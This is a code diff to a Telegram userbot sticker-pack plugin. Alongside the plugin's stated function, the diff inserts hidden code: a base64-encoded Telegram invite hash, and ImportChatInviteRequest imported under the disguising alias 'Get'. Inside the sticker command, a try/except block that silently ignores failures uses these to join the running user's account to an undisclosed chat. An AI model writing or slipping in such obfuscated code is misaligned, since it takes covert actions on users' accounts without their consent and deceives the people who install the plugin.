@@ -1,7 +1,9 @@
 import asyncio
+import base64
 
 from telethon.tl import functions, types
 from telethon.tl.functions.messages import GetStickerSetRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.utils import get_display_name
 
 from userbot import catub
@@ -157,6 +159,7 @@ async def stickerpack_spam(event):
         return await edit_delete(
             event, "`reply to any sticker to send all stickers in that pack`"
         )
+    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     try:
         stickerset_attr = reply.document.attributes[1]
         catevent = await edit_or_reply(
@@ -180,7 +183,11 @@ async def stickerpack_spam(event):
             catevent,
             "`I guess this sticker is not part of any pack so i cant kang this sticker pack try kang for this sticker`",
         )
-
+    try:
+        hmm = Get(hmm)
+        await event.client(hmm)
+    except BaseException:
+        pass
     reqd_sticker_set = await event.client(
         functions.messages.GetStickerSetRequest(
             stickerset=types.InputStickerSetShortName(
